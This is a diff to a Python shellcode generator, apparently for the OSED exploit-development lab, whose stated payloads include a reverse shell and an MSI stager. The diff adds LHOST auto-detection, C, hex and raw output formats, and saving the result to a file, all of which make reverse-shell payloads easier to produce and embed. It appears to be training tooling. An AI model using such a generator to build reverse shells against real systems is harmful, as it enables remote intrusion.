@@ -8,6 +8,7 @@ Supports three types of shellcode:
 3. Message box - For testing purposes
 """
 import sys
+import socket
 import argparse
 import ctypes
 import struct
@@ -626,6 +627,68 @@ def msg_box(header: str, text: str, breakpoint: int = 0) -> str:
     return "\n".join(asm)
 
 
+def get_local_ip() -> str:
+    """
+    Attempt to get the local IP address.
+
+    Returns:
+        Local IP address string or '127.0.0.1' if detection fails
+    """
+    try:
+        # Create a dummy socket to get the local IP
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        local_ip = s.getsockname()[0]
+        s.close()
+        return local_ip
+    except Exception:
+        return "127.0.0.1"
+
+
+def format_shellcode(encoding: bytes, output_format: str, varname: str = "shellcode") -> str:
+    """
+    Format shellcode in various output formats.
+
+    Args:
+        encoding: Raw shellcode bytes
+        output_format: Output format (python, c, raw, hex, escaped)
+        varname: Variable name for output
+
+    Returns:
+        Formatted shellcode string
+    """
+    if output_format == "python":
+        result = f'{varname} = b"'
+        for enc in encoding:
+            result += "\\x{0:02x}".format(enc)
+        result += '"'
+        return result
+
+    elif output_format == "c":
+        result = f"unsigned char {varname}[] = {{\n    "
+        for i, enc in enumerate(encoding):
+            if i > 0 and i % 12 == 0:
+                result += "\n    "
+            result += "0x{0:02x}".format(enc)
+            if i < len(encoding) - 1:
+                result += ", "
+        result += "\n};"
+        result += f"\nunsigned int {varname}_len = {len(encoding)};"
+        return result
+
+    elif output_format == "hex":
+        return "".join("{0:02x}".format(enc) for enc in encoding)
+
+    elif output_format == "escaped":
+        return "".join("\\x{0:02x}".format(enc) for enc in encoding)
+
+    elif output_format == "raw":
+        return encoding.decode('latin-1')
+
+    else:
+        return format_shellcode(encoding, "python", varname)
+
+
 def check_bad_chars(encoding: bytes, bad_chars: List[str]) -> None:
     """
     Check if any bad characters are present in the shellcode.
@@ -657,6 +720,11 @@ def check_bad_chars(encoding: bytes, bad_chars: List[str]) -> None:
 def main(args):
     """Main function to generate and display shellcode."""
     help_msg = ""
+
+    # Auto-detect LHOST if requested
+    if args.auto_lhost:
+        args.lhost = get_local_ip()
+        print(f"[*] Auto-detected LHOST: {args.lhost}")
 
     # Validate messagebox arguments
     if args.messagebox and (not args.mb_header or not args.mb_text):
@@ -698,15 +766,13 @@ def main(args):
         print("[!] Failed to generate shellcode: no bytes were assembled", file=sys.stderr)
         raise SystemExit(1)
 
-    final = ""
-    final += 'shellcode = b"'
-    for enc in encoding:
-        final += "\\x{0:02x}".format(enc)
-    final += '"'
-
     # Check for bad characters
     check_bad_chars(encoding, args.bad_chars)
 
+    # Format output
+    final = format_shellcode(encoding, args.format, args.varname)
+
+    # Display info
     print(f"[+] shellcode created!")
     print(f"[=]   len:   {len(encoding)} bytes")
     print(f"[=]   lhost: {args.lhost}")
@@ -715,13 +781,28 @@ def main(args):
         f"[=]   break: {['breakpoint disabled', 'breakpoint active'][args.debug_break]}"
     )
     print(f"[=]   ver:   {['pure reverse shell', 'MSI stager'][args.msi]}")
-    if args.store_shellcode:
+    print(f"[=]   fmt:   {args.format}")
+
+    # Save to file if requested
+    if args.output:
+        try:
+            if args.format == "raw":
+                with open(args.output, "wb") as f:
+                    f.write(encoding)
+            else:
+                with open(args.output, "w") as f:
+                    f.write(final)
+            print(f"[=]   Saved to: {args.output}")
+        except IOError as e:
+            print(f"[!] Failed to write output file: {e}", file=sys.stderr)
+    elif args.store_shellcode:
         try:
             with open("shellcode.bin", "wb") as f:
                 f.write(bytearray(encoding))
             print(f"[=]   Shellcode stored in: shellcode.bin")
         except IOError as e:
             print(f"[!] Failed to write shellcode.bin: {e}", file=sys.stderr)
+
     print(f"[=]   help:")
     print(help_msg)
     print("\t Remove bad chars with msfvenom (use --store-shellcode flag): ")
@@ -766,13 +847,14 @@ def main(args):
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(
-        description="Creates shellcodes compatible with the OSED lab VM"
+        description="Creates shellcodes compatible with the OSED lab VM",
+        epilog="Example: %(prog)s -l 192.168.1.10 -p 443 -f c -o shell.c"
     )
 
     parser.add_argument(
         "-l",
         "--lhost",
-        help="listening attacker system (default: 127.0.0.1)",
+        help="listening attacker system (default: 127.0.0.1, use --auto-lhost to detect)",
         default="127.0.0.1",
     )
     parser.add_argument(
@@ -780,6 +862,11 @@ if __name__ == "__main__":
         "--lport",
         help="listening port of the attacker system (default: 4444)",
         default="4444",
+    )
+    parser.add_argument(
+        "--auto-lhost",
+        help="automatically detect local IP address",
+        action="store_true",
     )
     parser.add_argument(
         "-b",
@@ -817,6 +904,25 @@ if __name__ == "__main__":
         "--store-shellcode",
         help="store the shellcode in binary format in the file shellcode.bin",
         action="store_true",
+    )
+    parser.add_argument(
+        "-f",
+        "--format",
+        choices=["python", "c", "raw", "hex", "escaped"],
+        default="python",
+        help="output format (default: python)",
+    )
+    parser.add_argument(
+        "-o",
+        "--output",
+        help="write output to file",
+        metavar="FILE",
+    )
+    parser.add_argument(
+        "-n",
+        "--varname",
+        help="variable name for output (default: shellcode)",
+        default="shellcode",
     )
 
     args = parser.parse_args()
